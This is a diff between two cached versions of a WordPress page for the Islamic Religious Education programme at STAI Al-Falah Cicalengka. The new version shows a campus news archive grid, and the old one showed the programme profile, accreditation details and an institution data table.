+			<p>Bandung – Pada Selasa, 01 Oktober 2024, STAI Al-Falah Cicalengka&hellip;</p>
+		</div>
+		                                    </div>
+
+            </div><!-- .blog-inner -->
+           
+        </article>
+
+        
+        <article id="post-1080" class="wpcap-post post-1080 post type-post status-publish format-standard has-post-thumbnail hentry category-berita-kampus ast-article-single">
+         
+            <div class="post-grid-inner">
+                
+                			<div class="post-grid-thumbnail">
+				<a href="https://pai.staialfalah.ac.id/stai-al-falah-gelar-studium-generale-bersama-sekretaris-dirjen-pendis-kemenag-ri/">
+					<img loading="lazy" decoding="async" width="245" height="300" src="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/StudiumGenerale2024-1-245x300.webp" class="attachment-medium size-medium wp-post-image" alt="" srcset="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/StudiumGenerale2024-1-245x300.webp 245w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/StudiumGenerale2024-1-768x939.webp 768w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/StudiumGenerale2024-1.webp 828w" sizes="(max-width: 245px) 100vw, 245px" />				</a>
+			</div>
+        
+                <div class="post-grid-text-wrap">
+                    		<div class="post-grid-meta">
+			
+				<span class="post-date"><time datetime="2024-07-05T15:36:36+00:00">Juli 5, 2024</time></span>
+
+				
+				<span class="post-comments">Tidak ada komentar</span>
+
+						</div>
+		                    		<h5 class="title">
+			<a href="https://pai.staialfalah.ac.id/stai-al-falah-gelar-studium-generale-bersama-sekretaris-dirjen-pendis-kemenag-ri/">STAI Al-Falah Gelar Studium Generale Bersama Sekretaris Dirjen Pendis Kemenag RI</a>
+		</h5>
+		                    		<div class="post-grid-excerpt">
+			<p>Bandung&nbsp;– Sekolah Tinggi Agama Islam (STAI) Al-Falah mengadakan acara Stadium&hellip;</p>
+		</div>
+		                                    </div>
+
+            </div><!-- .blog-inner -->
+           
+        </article>
+
+        
+        <article id="post-1076" class="wpcap-post post-1076 post type-post status-publish format-standard has-post-thumbnail hentry category-berita-kampus ast-article-single">
+         
+            <div class="post-grid-inner">
+                
+                			<div class="post-grid-thumbnail">
+				<a href="https://pai.staialfalah.ac.id/benchmarking-stai-al-falah-cicalengka-bandung-ke-stai-miftahul-huda-subang/">
+					<img loading="lazy" decoding="async" width="300" height="225" src="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/BenchmarkingMiftahulHuda-2-300x225.webp" class="attachment-medium size-medium wp-post-image" alt="" srcset="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/BenchmarkingMiftahulHuda-2-300x225.webp 300w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/BenchmarkingMiftahulHuda-2-1024x768.webp 1024w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/BenchmarkingMiftahulHuda-2-768x576.webp 768w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/BenchmarkingMiftahulHuda-2-1536x1151.webp 1536w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/BenchmarkingMiftahulHuda-2-2048x1535.webp 2048w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
+			</div>
+        
+                <div class="post-grid-text-wrap">
+                    		<div class="post-grid-meta">
+			
+				<span class="post-date"><time datetime="2024-05-19T15:30:00+00:00">Mei 19, 2024</time></span>
+
+				
+				<span class="post-comments">Tidak ada komentar</span>
+
+						</div>
+		                    		<h5 class="title">
+			<a href="https://pai.staialfalah.ac.id/benchmarking-stai-al-falah-cicalengka-bandung-ke-stai-miftahul-huda-subang/">Benchmarking STAI Al-Falah Cicalengka Bandung Ke STAI Miftahul Huda Subang</a>
+		</h5>
+		                    		<div class="post-grid-excerpt">
+			<p>Subang – Senin, 13 Mei 2024, STAI Al Falah Cicalengka&hellip;</p>
+		</div>
+		                                    </div>
+
+            </div><!-- .blog-inner -->
+           
+        </article>
+
+        
+			</div>
+		</div>
+				</div>
 				</div>
 					</div>
 		</div>
 					</div>
 		</section>
-				<section class="elementor-section elementor-top-section elementor-element elementor-element-ad1a44d elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="ad1a44d" data-element_type="section">
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-dd27350 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="dd27350" data-element_type="section">
 						<div class="elementor-container elementor-column-gap-default">
-					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-912cb11" data-id="912cb11" data-element_type="column">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-7b5f5bd" data-id="7b5f5bd" data-element_type="column">
 			<div class="elementor-widget-wrap elementor-element-populated">
-						<div class="elementor-element elementor-element-74d2e3c elementor-widget elementor-widget-heading" data-id="74d2e3c" data-element_type="widget" data-widget_type="heading.default">
-				<div class="elementor-widget-container">
-			<h2 class="elementor-heading-title elementor-size-default">Program Studi Pendidikan agama Islam Alfalah Cicalengka Bandung merupakan salah satu program studi pertama sekaligus unggulan yang ada di STAI Alfalah Cicalengka Bandung dengan akreditasi B sesuai dengan nomor SK Ban PT no.201/SK/BAN-PT/Ak-ppj/s/I/2021 yang saat ini sudah melaksanakan konversi nilai sesuai SK BAN PT tentang konversi akreditasi dari standar 7 ke kriteria 9 serta berharap nilai konversi akreditasi ini menjadi Baik Sekali. Program Studi PAI bertujuan (1) menghasilkan guru agama Islam yg berakhlak mulia, berwawasan dan terampil mengelola pendidikan dan pengajaran (2) menghasilkan tenaga pendidik yang menguasai bahan ajar bidang studi agama Islam sehingga mampu memenuhi kebutuhan tenaga pendidik agama Islam bagi lembaga pemerintah dan swasta (3) menghasilkan tenaga pendidik yang menguasai teori dan keterampilan dalam bidang pendidikan agama Islam sehingga mampu mengerjakan tugas-tugas dan mengembangkan ilmu dan seni, kepwribadian dalam menunjang kerja profesional
-</h2>		</div>
-				</div>
-				<div class="elementor-element elementor-element-72b2829 elementor-widget elementor-widget-heading" data-id="72b2829" data-element_type="widget" data-widget_type="heading.default">
-				<div class="elementor-widget-container">
-			<h2 class="elementor-heading-title elementor-size-default">     Kurikulum Program studi Pendidikan Agama Islam (PAI) STAI Al Falah  Cicalengka Bandung berdasarkan  KKNI (Kerangka Kualifikasi Nasional Indonesia) dan MBKM (Merdeka Belajar Kampus Merdeka) Sehingga menghadirkan proses pembelajaran yang Berorientasi pada terciptanya mahasiswa yang profesional, berakhlak mulia, bermartabat dan kompetitif.</h2>		</div>
-				</div>
-					</div>
-		</div>
-					</div>
-		</section>
-				<section class="elementor-section elementor-top-section elementor-element elementor-element-5965c01 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="5965c01" data-element_type="section" data-settings="{&quot;shape_divider_bottom&quot;:&quot;opacity-tilt&quot;}">
-					<div class="elementor-shape elementor-shape-bottom" data-negative="false">
-			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 2600 131.1" preserveAspectRatio="none">
-	<path class="elementor-shape-fill" d="M0 0L2600 0 2600 69.1 0 0z"/>
-	<path class="elementor-shape-fill" style="opacity:0.5" d="M0 0L2600 0 2600 69.1 0 69.1z"/>
-	<path class="elementor-shape-fill" style="opacity:0.25" d="M2600 0L0 0 0 130.1 2600 69.1z"/>
-</svg>		</div>
-					<div class="elementor-container elementor-column-gap-default">
-					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-3cf9382" data-id="3cf9382" data-element_type="column">
-			<div class="elementor-widget-wrap elementor-element-populated">
-						<div class="elementor-element elementor-element-7acbd52 elementor-widget elementor-widget-text-editor" data-id="7acbd52" data-element_type="widget" data-widget_type="text-editor.default">
-				<div class="elementor-widget-container">
-							
-<table id="tablepress-2" class="tablepress tablepress-id-2">
-<thead>
-<tr class="row-1">
-	<th class="column-1">Perguruan Tinggi</th><th class="column-2">STAI Al-Falah Cicalengka Bandung</th>
-</tr>
-</thead>
-<tbody class="row-striping row-hover">
-<tr class="row-2">
-	<td class="column-1">Unit Pengelola Program Studi</td><td class="column-2">STAI Al-Falah Cicalengka Bandung</td>
-</tr>
-<tr class="row-3">
-	<td class="column-1">Jenis Program</td><td class="column-2">S1</td>
-</tr>
-<tr class="row-4">
-	<td class="column-1">Nama Program Studi</td><td class="column-2">Pendidikan Agama Islam</td>
-</tr>
-<tr class="row-5">
-	<td class="column-1">Alamat</td><td class="column-2">Jl Kapten Sangun No 06 Tenjolaya Cicalengka <br />
-Kabupaten Bandung  <br />
-</td>
-</tr>
-<tr class="row-6">
-	<td class="column-1">Nomor Telepon</td><td class="column-2">022-7948748</td>
-</tr>
-<tr class="row-7">
-	<td class="column-1">E-Mail dan Website</td><td class="column-2">pai@staialfalah.ac.id / https://pai.staialfalah.ac.id/</td>
-</tr>
-<tr class="row-8">
-	<td class="column-1">Nomor SK Pendirian PT 1)</td><td class="column-2">06/I/1986</td>
-</tr>
-<tr class="row-9">
-	<td class="column-1">Tanggal SK Pendirian PT</td><td class="column-2">15 Januari 1986</td>
-</tr>
-<tr class="row-10">
-	<td class="column-1">Pejabat Penandatangan SK Pendirian PT</td><td class="column-2">H. Zaini Dahlan, M.A.</td>
-</tr>
-<tr class="row-11">
-	<td class="column-1">Nomor SK Pembukaan PS 2)</td><td class="column-2">06/I/1986</td>
-</tr>
-<tr class="row-12">
-	<td class="column-1">Tanggal SK Pembukaan PS	</td><td class="column-2">15 Januari 1986</td>
-</tr>
-<tr class="row-13">
-	<td class="column-1">Pejabat Penandatangan SK Pembukaan PS</td><td class="column-2">H. Zaini Dahlan, M.A.</td>
-</tr>
-<tr class="row-14">
-	<td class="column-1">Tahun Pertama Kali Menerima Mahasiswa</td><td class="column-2">1986 </td>
-</tr>
-<tr class="row-15">
-	<td class="column-1">Peringkat Terbaru<br />
-Akreditasi PS<br />
-</td><td class="column-2">B (322)</td>
-</tr>
-<tr class="row-16">
-	<td class="column-1">Nomor SK BAN-PT</td><td class="column-2">201/SK/BAN-PT/Ak-PPJ/S/I/2021</td>
-</tr>
-</tbody>
-</table>
-<!-- #tablepress-2 from cache -->						</div>
-				</div>
-				<div class="elementor-element elementor-element-2d10e8f elementor-widget elementor-widget-spacer" data-id="2d10e8f" data-element_type="widget" data-widget_type="spacer.default">
+						<div class="elementor-element elementor-element-3180294 elementor-widget elementor-widget-spacer" data-id="3180294" data-element_type="widget" data-widget_type="spacer.default">
 				<div class="elementor-widget-container">
 					<div class="elementor-spacer">
 			<div class="elementor-spacer-inner"></div>
@@ -736,6 +969,7 @@ Akreditasi PS<br />
 			</script>
 			<link rel='stylesheet' id='widget-icon-list-css' href='https://pai.staialfalah.ac.id/wp-content/plugins/elementor/assets/css/widget-icon-list.min.css?ver=3.25.11' media='all' />
 <link rel='stylesheet' id='widget-image-css' href='https://pai.staialfalah.ac.id/wp-content/plugins/elementor/assets/css/widget-image.min.css?ver=3.25.11' media='all' />
+<link rel='stylesheet' id='widget-text-editor-css' href='https://pai.staialfalah.ac.id/wp-content/plugins/elementor/assets/css/widget-text-editor.min.css?ver=3.25.11' media='all' />
 <link rel='stylesheet' id='e-animation-pulse-grow-css' href='https://pai.staialfalah.ac.id/wp-content/plugins/elementor/assets/lib/animations/styles/e-animation-pulse-grow.min.css?ver=3.25.11' media='all' />
 <link rel='stylesheet' id='e-animation-fadeInDown-css' href='https://pai.staialfalah.ac.id/wp-content/plugins/elementor/assets/lib/animations/styles/fadeInDown.min.css?ver=3.25.11' media='all' />
 <link rel='stylesheet' id='widget-social-icons-css' href='https://pai.staialfalah.ac.id/wp-content/plugins/elementor/assets/css/widget-social-icons.min.css?ver=3.25.11' media='all' />
@@ -752,17 +986,9 @@ var astra = {"break_point":"921","isRtl":""};
 <script src="https://pai.staialfalah.ac.id/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.25.11" id="elementor-frontend-modules-js"></script>
 <script src="https://pai.staialfalah.ac.id/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
 <script id="elementor-frontend-js-before">
-var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Bagikan di Facebook","shareOnTwitter":"Bagikan di Twitter","pinIt":"Buat Pin","download":"Unduh","downloadImage":"Unduh gambar","fullscreen":"Layar Penuh","zoom":"Perbesar","share":"Bagikan","playVideo":"Putar Video","previous":"Sebelumnya","next":"Selanjutnya","close":"Tutup","a11yCarouselWrapperAriaLabel":"Carousel | Horizontal scrolling: Arrow Left & Right","a11yCarouselPrevSlideMessage":"Slide sebelumnya","a11yCarouselNextSlideMessage":"Slide selanjutnya","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Layar lebar","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.25.11","is_static":false,"experimentalFeatures":{"additional_custom_breakpoints":true,"e_swiper_latest":true,"e_nested_atomic_repeaters":true,"e_optimized_control_loading":true,"e_onboarding":true,"e_css_smooth_scroll":true,"home_screen":true,"landing-pages":true,"nested-elements":true,"editor_v2":true,"link-in-bio":true,"floating-buttons":true},"urls":{"assets":"https:\/\/pai.staialfalah.ac.id\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/pai.staialfalah.ac.id\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/pai.staialfalah.ac.id\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"7ef4995dce"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":163,"title":"PROFIL%20PRODI%20%E2%80%93%20Pendidikan%20Agama%20Islam","excerpt":"","featuredImage":false}};
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Bagikan di Facebook","shareOnTwitter":"Bagikan di Twitter","pinIt":"Buat Pin","download":"Unduh","downloadImage":"Unduh gambar","fullscreen":"Layar Penuh","zoom":"Perbesar","share":"Bagikan","playVideo":"Putar Video","previous":"Sebelumnya","next":"Selanjutnya","close":"Tutup","a11yCarouselWrapperAriaLabel":"Carousel | Horizontal scrolling: Arrow Left & Right","a11yCarouselPrevSlideMessage":"Slide sebelumnya","a11yCarouselNextSlideMessage":"Slide selanjutnya","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Layar lebar","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.25.11","is_static":false,"experimentalFeatures":{"additional_custom_breakpoints":true,"e_swiper_latest":true,"e_nested_atomic_repeaters":true,"e_optimized_control_loading":true,"e_onboarding":true,"e_css_smooth_scroll":true,"home_screen":true,"landing-pages":true,"nested-elements":true,"editor_v2":true,"link-in-bio":true,"floating-buttons":true},"urls":{"assets":"https:\/\/pai.staialfalah.ac.id\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/pai.staialfalah.ac.id\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/pai.staialfalah.ac.id\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"7d8e2905da"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":896,"title":"Arsip%20Berita%20%E2%80%93%20Pendidikan%20Agama%20Islam","excerpt":"","featuredImage":false}};
 </script>
 <script src="https://pai.staialfalah.ac.id/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.25.11" id="elementor-frontend-js"></script>
-<script src="https://pai.staialfalah.ac.id/wp-content/plugins/tablepress/js/jquery.datatables.min.js?ver=3.0.1" id="tablepress-datatables-js"></script>
-<script id="tablepress-datatables-js-after">
-var DT_TP = {};
-jQuery(($)=>{
-var DT_language={"id_ID":{"info":"Menampilkan _START_ sampai _END_ dari _TOTAL_ entri","infoEmpty":"Menampilkan 0 sampai 0 dari 0 entri","infoFiltered":"(disaring dari _MAX_ entri keseluruhan)","infoPostFix":"","lengthMenu":"Tampilkan _MENU_ entri","processing":"Sedang memproses...","search":"Cari:","zeroRecords":"Tidak ditemukan data yang sesuai","paginate":{"first":"❮❮","previous":"❮","next":"❯","last":"❯❯"},"decimal":",","thousands":"."}};
-DT_TP['2'] = new DataTable('#tablepress-2',{language:DT_language['id_ID'],ordering:false,pagingType:'simple_numbers',lengthChange:false});
-});
-</script>
 			<script>
 			/(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())},!1);
 			</script>
@@ -770,4 +996,4 @@ DT_TP['2'] = new DataTable('#tablepress-2',{language:DT_language['id_ID'],orderi
 </html>
 
 
-<!-- Page cached by LiteSpeed Cache 6.5.3 on 2025-10-16 03:10:05 -->
+<!-- Page cached by LiteSpeed Cache 6.5.3 on 2025-10-14 20:49:08 -->
